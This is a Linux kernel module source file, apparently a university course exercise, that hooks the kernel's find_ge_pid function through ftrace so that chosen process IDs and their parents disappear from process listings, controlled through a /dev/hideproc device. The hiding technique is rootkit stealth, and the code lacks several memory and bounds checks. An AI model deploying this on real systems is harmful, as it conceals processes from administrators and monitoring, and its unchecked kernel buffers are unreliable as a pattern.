#include <linux/cdev.h>
#include <linux/ftrace.h>
#include <linux/kallsyms.h>
#include <linux/list.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/pid.h>
#include <linux/hashtable.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("National Cheng Kung University, Taiwan");

enum RETURN_CODE { SUCCESS };

struct ftrace_hook {
    const char *name;
    void *func, *orig;
    unsigned long address;
    struct ftrace_ops ops;
};

static int hook_resolve_addr(struct ftrace_hook *hook)
{
    hook->address = kallsyms_lookup_name(hook->name);
    if (!hook->address) {
        printk("unresolved symbol: %s\n", hook->name);
        return -ENOENT;
    }
    *((unsigned long *) hook->orig) = hook->address;
    return 0;
}

static void notrace hook_ftrace_thunk(unsigned long ip,
                                      unsigned long parent_ip,
                                      struct ftrace_ops *ops,
                                      struct pt_regs *regs)
{
    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);
    if (!within_module(parent_ip, THIS_MODULE))
        regs->ip = (unsigned long) hook->func;
}

static int hook_install(struct ftrace_hook *hook)
{
    int err = hook_resolve_addr(hook);
    if (err)
        return err;

    hook->ops.func = hook_ftrace_thunk;
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_RECURSION_SAFE |
                      FTRACE_OPS_FL_IPMODIFY;

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
    if (err) {
        printk("ftrace_set_filter_ip() failed: %d\n", err);
        return err;
    }

    err = register_ftrace_function(&hook->ops);
    if (err) {
        printk("register_ftrace_function() failed: %d\n", err);
        ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
        return err;
    }
    return 0;
}

void hook_remove(struct ftrace_hook *hook)
{
    int err = unregister_ftrace_function(&hook->ops);
    if (err)
        printk("unregister_ftrace_function() failed: %d\n", err);
    err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
    if (err)
        printk("ftrace_set_filter_ip() failed: %d\n", err);
}

typedef struct {
    pid_t id;
    struct hlist_node node;
} pid_node_t;

DEFINE_HASHTABLE(hidden_proc, 4);

typedef struct pid *(*find_ge_pid_func)(int nr, struct pid_namespace *ns);
static find_ge_pid_func real_find_ge_pid;

static struct ftrace_hook hook;

static bool is_hidden_proc(pid_t pid)
{
    struct hlist_node *tmp;
    pid_node_t *proc;
    int bkt;

    hash_for_each_safe(hidden_proc, bkt, tmp, proc, node){
        if (proc->id == pid)
            return true;
    }
    return false;
}

static struct pid *hook_find_ge_pid(int nr, struct pid_namespace *ns)
{
    struct pid *pid = real_find_ge_pid(nr, ns);
    while (pid && is_hidden_proc(pid->numbers->nr))
        pid = real_find_ge_pid(pid->numbers->nr + 1, ns);
    return pid;
}

static void init_hook(void)
{
    real_find_ge_pid = (find_ge_pid_func) kallsyms_lookup_name("find_ge_pid");
    hook.name = "find_ge_pid";
    hook.func = hook_find_ge_pid;
    hook.orig = &real_find_ge_pid;
    hook_install(&hook);
}

static int hide_process(pid_t pid)
{
    pid_node_t *proc;

    if(is_hidden_proc(pid)){
        pr_info("PID=%d is already hidden\n", pid);
        return -EINVAL;
    }

    proc = kmalloc(sizeof(pid_node_t), GFP_KERNEL);
    proc->id = pid;
    hash_add(hidden_proc, &proc->node, proc->id);
    return SUCCESS;
}

static int unhide_process(pid_t pid)
{
    struct hlist_node *tmp;
    pid_node_t *proc;
    int bkt;

    if(hash_empty(hidden_proc)){
        pr_info("hash table is empty\n");
        return -ENOENT;
    }

    if(pid == -1){
        hash_for_each_safe(hidden_proc, bkt, tmp, proc, node){
            hash_del(&proc->node);
            kfree(proc);
        }
    } else {
        hash_for_each_safe(hidden_proc, bkt, tmp, proc, node){
            if(proc->id == pid){
                hash_del(&proc->node);
                kfree(proc);
            }
        }
    }

    return SUCCESS;
}

#define OUTPUT_BUFFER_FORMAT "pid: %d\n"
#define MAX_MESSAGE_SIZE (sizeof(OUTPUT_BUFFER_FORMAT) + 4)

static int device_open(struct inode *inode, struct file *file)
{
    return SUCCESS;
}

static int device_close(struct inode *inode, struct file *file)
{
    return SUCCESS;
}

static ssize_t device_read(struct file *filep,
                           char *buffer,
                           size_t len,
                           loff_t *offset)
{
    struct hlist_node *tmp;
    pid_node_t *proc;
    int bkt;
    char message[MAX_MESSAGE_SIZE];
    if (*offset)
        return 0;

    hash_for_each_safe(hidden_proc, bkt, tmp, proc, node){
        memset(message, 0, MAX_MESSAGE_SIZE);
        sprintf(message, OUTPUT_BUFFER_FORMAT, proc->id);
        copy_to_user(buffer + *offset, message, strlen(message));
        *offset += strlen(message);
    }

    return *offset;
}

typedef int (*hide_handler)(pid_t);

void device_write_handler(char *message, 
                          char *cmd,
                          hide_handler handler)
{

    struct task_struct *tsk;
    pid_t ppid;

    long pid;
    char *ptr, *qtr, *end;

    ptr = message + strlen(cmd) + 1;         /* skip cmd */
    end = message + strlen(message);

    while(1){
        qtr = memchr(ptr, ',', end - ptr);
        if(!qtr){
            kstrtol(ptr, 10, &pid);

            tsk = pid_task(find_vpid(pid), PIDTYPE_PID);
            if(!tsk){
                if(!memcmp(cmd, "del", 3) && pid == -1)   /* remove all hideproc */ 
                    handler(pid);
                break;
            }

            if(tsk->parent){
                ppid = tsk->parent->pid;
                handler(ppid);
            }

            handler(pid);
            break;
        }
        *qtr = '\0';
        kstrtol(ptr, 10, &pid);

        tsk = pid_task(find_vpid(pid), PIDTYPE_PID);
        if(!tsk)
            goto next;

        if(tsk->parent){
            ppid = tsk->parent->pid;
            handler(ppid);
        }
        handler(pid);

    next:
        ptr += (qtr - ptr + 1);
    }
}

static ssize_t device_write(struct file *filep,
                            const char *buffer,
                            size_t len,
                            loff_t *offset)
{
    char *message;

    char add_message[] = "add", del_message[] = "del";
    if (len < sizeof(add_message) - 1 && len < sizeof(del_message) - 1)
        goto err;

    /* guaratees message contains PID */
    if(len >= 5){   
        message = kmalloc(len + 1, GFP_KERNEL);
        memset(message, 0, len + 1);
        copy_from_user(message, buffer, len);

        if (!memcmp(message, add_message, sizeof(add_message) - 1)) {
            device_write_handler(message, add_message, hide_process);
        } else if (!memcmp(message, del_message, sizeof(del_message) - 1)) {
            device_write_handler(message, del_message, unhide_process);
        } else {
            kfree(message);
            goto err;
        }

        *offset = len;
        kfree(message);
        return len;
    }

err:
    return -EAGAIN;
}

static struct cdev cdev;
static struct class *hideproc_class = NULL;

static const struct file_operations fops = {
    .owner = THIS_MODULE,
    .open = device_open,
    .release = device_close,
    .read = device_read,
    .write = device_write,
};

#define MINOR_VERSION 1
#define DEVICE_NAME "hideproc"

int dev_major;

static int _hideproc_init(void)
{
    int err;
    dev_t dev;
    printk(KERN_INFO "@ %s\n", __func__);
    err = alloc_chrdev_region(&dev, 0, MINOR_VERSION, DEVICE_NAME);
    dev_major = MAJOR(dev);

    hideproc_class = class_create(THIS_MODULE, DEVICE_NAME);

    cdev_init(&cdev, &fops);
    cdev_add(&cdev, MKDEV(dev_major, MINOR_VERSION), 1);
    device_create(hideproc_class, NULL, MKDEV(dev_major, MINOR_VERSION), NULL,
                  DEVICE_NAME);

    init_hook();

    return 0;
}

static void _hideproc_exit(void)
{
    printk(KERN_INFO "@ %s\n", __func__);
    /* FIXME: ensure the release of all allocated resources */
    hook_remove(&hook);
    device_destroy(hideproc_class, MKDEV(dev_major, MINOR_VERSION));
    cdev_del(&cdev);
    class_destroy(hideproc_class);
}

module_init(_hideproc_init);
module_exit(_hideproc_exit);